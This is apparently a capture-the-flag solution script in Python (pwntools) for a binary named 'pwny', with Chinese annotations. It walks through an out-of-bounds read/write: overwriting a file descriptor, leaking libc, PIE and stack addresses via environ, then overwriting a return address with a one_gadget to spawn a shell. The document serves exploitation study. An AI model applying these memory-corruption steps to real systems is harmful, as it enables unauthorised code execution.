from pwn import *
context.binary = './pwny'
sh = process("./pwny", env={'LD_PRELOAD': './libc-2.27.so'})
# sh = process(["./ld-2.27.so", "./pwny"], env={'LD_PRELOAD': './libc-2.27.so'})
# sh = remote("124.71.229.55", "22991")


def read(idx):
    sh.sendlineafter("Your choice: ", "1")
    sh.sendlineafter(b"Index: ", p64(idx & 0xffffffffffffffff))  # 16个f


def write(idx, buf='', is_stdin=False):  # id=1
    # sh.sendlineafter("Your choice: ", "2")
    sh.recvuntil("choice: ")
    sh.sendline("2")
    # __printf_chk(1LL, "Index: "); __isoc99_scanf("%ld", &v2);
    sh.sendlineafter("Index: ", str(idx))
    if(is_stdin == True):
        sh.send(buf)  # read((unsigned __int8)fd, &v2, 8uLL);


# ===== STEP-1 覆盖fd为 0(stdin)
write(256)  # qword_202060 idx=256刚好就是fd的存储位置，都在.bbs段
# 第一次 write(256) 会将fd覆盖为一个随机数
# gdb.attach(sh)
write(256)  # 第二次 write(256) 时，由于fd被覆盖为一个随机数(并且大概率不是0,1,2,3)
# 这就导致了这个fd实际上是未打开，没有对应文件/socket的。导致buf被置为0，然后 arr[256](i.e. fd) = 0

# ===== STEP-2 计算libc基址
read(-4)  # arr[-4] 即为 stderr 的值(from IDA analysis) # stdin stdout 也在附近，也可以用
sh.recvuntil("Result: ")
# 接收程序返回的stderr的地址，按16进制解析（因为程序中输出的方式为 %lx）
stderr = int(b"0x" + sh.recvline(keepends=False), 16)  # recv actual addr of stderr
libc = ELF("./libc-2.27.so")  # 获取ELF文件的信息
print("addr of stderr =", hex(stderr))
libc.address = stderr - libc.sym['_IO_2_1_stderr_']  # libc基地址 # sym: Alias for ELF.symbols
print("addr of libc-2.27.so =", hex(libc.address))

# ===== STEP-3 计算pwny pie基址，得到arr真实地址 # 这一步用 0x201d80 上的也行，应该还有很多能用的
# .bss:202060 arr dq 100h dup(?) # 0x202060即为分析中所说的 size=0x100 的矩阵 arr
# .data:202008 off_202008  dq offset off_202008
read(-0xb)  # 0x202060(addr of arr) - 0x58(0xb x 8) = 0x202008
sh.recvuntil("Result: ")
pie = int(b"0x" + sh.recvline(keepends=False), 16) - 0x202008
arr_addr = pie + 0x202060
print("PIE address =", hex(pie), "addr of arr =", hex(arr_addr))


def calc(addr):  # 计算想要的地址相对于 addr of arr 的 index
    return int((addr - arr_addr) / 8)


# ===== STEP-4 获得 environ 地址
# .text:8B4  call ___isoc99_scanf ; main __printf_chk(1LL, "Your choice: ");后的输入
# 0xC06 write_handler 中 arr[idx] = v2; 对应的汇编语句
gdb.attach(sh, "b *$rebase(0x8b4)\nb *$rebase(0xC06)\nc")  # 这个attach可以用于分析返回地址与environ的差值
environ = libc.sym['environ']
# 在libc中保存了一个函数叫_environ，存的是当前进程的环境变量,通过_environ的地址得到_environ的值，从而得到环境变量地址
# 环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量
read(calc(environ))
print("calc(environ)=", hex(calc(environ)), " libc.sym['environ'] =", hex(libc.sym['environ']))
sh.recvuntil("Result: ")
# 原exp这里最后要 - 0xa00 后面计算environ的时候再加回来，具体原因未知。其实是因为我还不懂environ具体是什么
environ = int(b"0x" + sh.recvline(keepends=False), 16)

print("addr of environ =", hex(environ))

# write(calc(environ), p64(0xdeadbeef), True)  # 实际上这里的操作没有作用 # 仅便于调试?

stack = environ - 0x120  # write handler 的返回地址 # 原exp这里是 + 0x8e0
print("stack =", hex(stack), "stack+0x70 =", hex(stack + 0x70))
# constraints: [rsp+0x70] == NULL # 0x10a41c one_gadgets 的约束条件
write(calc(stack + 0x70), p64(0), True)  # 为满足0x10a41c 的 one_gadgets 的约束条件
# one_gadget 0x10a41c execve("/bin/sh", rsp+0x70, environ)
write(calc(stack), p64(libc.address + 0x10a41c), True)  # 向RA写入 one_gadgets 地址


sh.interactive()
